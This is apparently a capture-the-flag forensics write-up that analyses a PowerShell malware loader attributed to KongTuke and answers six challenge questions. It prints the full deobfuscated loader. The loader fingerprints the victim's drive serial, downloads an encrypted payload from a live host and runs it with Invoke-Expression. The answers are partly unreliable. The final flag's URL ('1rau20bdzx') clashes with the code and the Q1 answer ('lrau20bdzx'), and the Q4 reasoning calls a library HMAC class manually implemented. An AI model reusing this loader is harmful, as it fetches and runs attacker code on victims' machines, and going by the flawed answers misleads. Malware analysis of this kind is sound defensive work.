# OmniCTF 2026 Quals - Miletus Write-Up - Forensics
Author: Masquerade

Forensics/Malware all the files are present in the zip 

Flag Format:OmniCTF{q1+q2+q3...}

**Caution**

DISCLAIMER:This is real MALWARE don't run it on your computer without the proper tools!!

**Important**

Password: infected

## Solution

### Deobfuscation
This is some obfuscated code. Step 1 is to deobfuscate it. I wrote a script to deobfuscate the code.
```bash
python3 solve.py virus.ps1
cat virus.ps1.stage2.formatted.ps1 
```
Results:

```powershell
function Get-HWID{
    $fso=New-Object -Com "Scripting.FileSystemObject";
    $SerialNumber=$fso.GetDrive("c:\").SerialNumber;
    $SerialNumber="{0:X}" -f $SerialNumber;
    $SerialNumber=[convert]::toint64($SerialNumber,16);
    return $SerialNumber
};
function Get-ValuePlain{
    param([string]$Url,[string]$Pass);
    function B64([string]$s){
        [Convert]::FromBase64String($s)
    };
    function B([string]$s){
        [Text.Encoding]::UTF8.GetBytes($s)
    };
    function ConstEq([byte[]]$a,[byte[]]$b){
        if($a -eq $null -or $b -eq $null -or $a.Length -ne $b.Length){
            return $false
        };
        $x=0;
        for($i=0;$i -lt $a.Length;$i++){
            $x=$x -bor ($a[$i] -bxor $b[$i])
        };
        return ($x -eq 0)
    };
    function PBKDF2SHA256([byte[]]$pwd,[byte[]]$salt,[int]$iter,[int]$len){
        $h=32;
        $blocks=[int][math]::Ceiling($len/$h);
        $out=New-Object byte[] ($blocks*$h);
        $off=0;
        for($blk=1;$blk -le $blocks;$blk++){
            $hmac=[System.Security.Cryptography.HMACSHA256]::new($pwd);
            $buf=New-Object byte[] ($salt.Length+4);
            [Array]::Copy($salt,0,$buf,0,$salt.Length);
            $buf[$salt.Length+0]=[byte](($blk -shr 24) -band 0xFF);
            $buf[$salt.Length+1]=[byte](($blk -shr 16) -band 0xFF);
            $buf[$salt.Length+2]=[byte](($blk -shr 8) -band 0xFF);
            $buf[$salt.Length+3]=[byte]($blk -band 0xFF);
            $u=$hmac.ComputeHash($buf);
            $t=New-Object byte[] $h;
            [Array]::Copy($u,$t,$h);
            for($i=2;$i -le $iter;$i++){
                $u=$hmac.ComputeHash($u);
                for($j=0;$j -lt $h;$j++){
                    $t[$j]=$t[$j] -bxor $u[$j]
                }
            };
            [Array]::Copy($t,0,$out,$off,$h);
            $off+=$h;
            $hmac.Dispose()
        };
        if($out.Length -gt $len){
            $r=New-Object byte[] $len;
            [Array]::Copy($out,0,$r,0,$len);
            return $r
        }
        else{
            return $out
        }
    };
    $raw=(Invoke-WebRequest -Uri $Url -UseBasicParsing -Method GET).Content;
    if($raw -isnot [string]){
        $raw=[string]$raw
    };
    $raw=$raw.Trim();
    $json=$raw;
    if(-not$json.StartsWith('{')){
        try{
            $decoded=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($raw));
            if($decoded.Trim().StartsWith('{')){
                $json=$decoded
            }
        }
        catch{
        }
    };
    $env=$json | ConvertFrom-Json;
    $iter=5000;
    if($env.iter){
        $iter=[int]$env.iter
    };
    $salt=B64 $env.salt;
    $iv=B64 $env.iv;
    $ct=B64 $env.ct;
    $tag=B64 $env.tag;
    $dk=PBKDF2SHA256 (B $Pass) $salt $iter 64;
    $encKey=$dk[0..31];
    $macKey=$dk[32..63];
    $aad=B 'WSv1';
    $macIn=New-Object byte[] ($aad.Length+$salt.Length+$iv.Length+$ct.Length);
    $o=0;
    [Array]::Copy($aad,0,$macIn,$o,$aad.Length);
    $o+=$aad.Length;
    [Array]::Copy($salt,0,$macIn,$o,$salt.Length);
    $o+=$salt.Length;
    [Array]::Copy($iv,0,$macIn,$o,$iv.Length);
    $o+=$iv.Length;
    [Array]::Copy($ct,0,$macIn,$o,$ct.Length);
    $h=[System.Security.Cryptography.HMACSHA256]::new($macKey);
    $calc=$h.ComputeHash($macIn);
    $h.Dispose();
    if(-not(ConstEq $calc $tag)){
        throw "HMAC failed"
    };
    $aes=[System.Security.Cryptography.Aes]::Create();
    $aes.Mode=[System.Security.Cryptography.CipherMode]::CBC;
    $aes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
    $aes.KeySize=256;
    $aes.Key=$encKey;
    $aes.IV=$iv;
    $dec=$aes.CreateDecryptor();
    $pt=$dec.TransformFinalBlock($ct,0,$ct.Length);
    $aes.Dispose();
    return [Text.Encoding]::UTF8.GetString($pt)
};
$hwid=Get-HWID;
$valUrl='https://gloason.com/white/lrau20bdzx/' + $hwid;
$httpUri='https://gloason.com/white/0barysbi8b07/' + $hwid;
$pass='16k3g6c0pwnj';
$plain=Get-ValuePlain -Url $valUrl -Pass $pass;
$Global:WLDR_HTTP_URI=$httpUri;
$Global:WLDR_ENC_PASSWORD=$pass;
Invoke-Expression $plain
```

**Question 1:**
> What is the URL where the scripts are invoked, including the password present in the script?

First, we check the file for URL like text, and we find:

$valUrl='https://gloason.com/white/lrau20bdzx/' + $hwid;

$httpUri='https://gloason.com/white/0barysbi8b07/' + $hwid;

So there are 2 potential URLs:
- https://gloason.com/white/lrau20bdzx/
- https://gloason.com/white/0barysbi8b07/

The first one is supplied directly to the ```Get-ValuePlain``` along with the password

```powershell
$plain = Get-ValuePlain -Url $valUrl -Pass $pass
```

You can see that the second one is only stored and never used, so the answer is: **https://gloason.com/white/lrau20bdzx/**.

**Question 2:**
> What is the unusual hexadecimal number appended to the URL?

```powershell
$valUrl='https://gloason.com/white/lrau20bdzx/' + $hwid;
```

So the unusual hexadecimal number is ```$hwid```.

If we look a bit up, we see:
```powershell
$hwid=Get-HWID;
```

And Get-HWID is defined as:
```powershell
function Get-HWID{
    $fso=New-Object -Com "Scripting.FileSystemObject";
    $SerialNumber=$fso.GetDrive("c:\").SerialNumber;
    $SerialNumber="{0:X}" -f $SerialNumber;
    $SerialNumber=[convert]::toint64($SerialNumber,16);
    return $SerialNumber
};
```

Therefore, the answer to question 2 is **SerialNumber**.

**Question 3:**
> What standard padding syntax is used for the encrypted data?

If we look at the following line:

```powershell
$aes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
```

We see the answer is **PKCS7**.

**Question 4:**
> What are the names of the two manually implemented functions used by the main cryptographic function? Use First_Second or Second_First.

We can notice that there is a cryptographic function named ```PBKDF2SHA256``` that first manually implements PBKDF2, which is the first manually implemented function. It creates:
```powershell
$hmac=[System.Security.Cryptography.HMACSHA256]::new($pwd);
```
Then, it performs PBKDF2 calculation manually:
```powershell
$u=$hmac.ComputeHash($buf);
$t=New-Object byte[] $h;
[Array]::Copy($u,$t,$h);
for($i=2;$i -le $iter;$i++){
  $u=$hmac.ComputeHash($u);
  for($j=0;$j -lt $h;$j++){
    $t[$j]=$t[$j] -bxor $u[$j]
  }
};
```

Then the author manually implements HMAC-SHA256 separately:

```powershell
$h=[System.Security.Cryptography.HMACSHA256]::new($macKey);
$calc=$h.ComputeHash($macIn);
$h.Dispose();
if(-not(ConstEq $calc $tag)){
  throw "HMAC failed"
};
```

Thus, the author uses 2 manual cryptographic functions: PBKDF2 and HMAC-SHA256.

The answer is **PBKDF2_HMAC-SHA256**.

**Question 5:**
> How many variables does the function involved in question 2 use, counting repeated variables?

To solve this challenge, we reexamine the Get-HWID function.

```powershell
function Get-HWID{
    $fso=New-Object -Com "Scripting.FileSystemObject"; # 1 use of fso
    $SerialNumber=$fso.GetDrive("c:\").SerialNumber; # 1 use of fso; 1 use of SerialNumber
    $SerialNumber="{0:X}" -f $SerialNumber; # 2 use of SerialNumber
    $SerialNumber=[convert]::toint64($SerialNumber,16); # 2 Use of SerialNumber
    return $SerialNumber # 1 Use of SerialNumber
};
```
After we count all these up, we get a total answer of **8**.

**Question 6:**
> What malware family is involved?

We can search for the URL to identify the malware family. By searching "gloason.com" we find the website https://threatfox.abuse.ch/ioc/1820633/.

On here it states that the malware is KongTuke.

Therefore, the final answer is **KongTuke**.


**Flag:** `OmniCTF{https://gloason.com/white/1rau20bdzx/+SerialNumber+PKCS7+PBKDF2_HMAC-SHA256+8+KongTuke}`

## Summary:
Q1 = https://gloason.com/white/lrau20bdzx/ 
Q2 = SerialNumber 
Q3 = PKCS7 
Q4 = PBKDF2_HMAC-SHA256
Q5 = 8
Q6 = KongTuke

Combining them gives `OmniCTF{https://gloason.com/white/1rau20bdzx/+SerialNumber+PKCS7+PBKDF2_HMAC-SHA256+8+KongTuke}`.
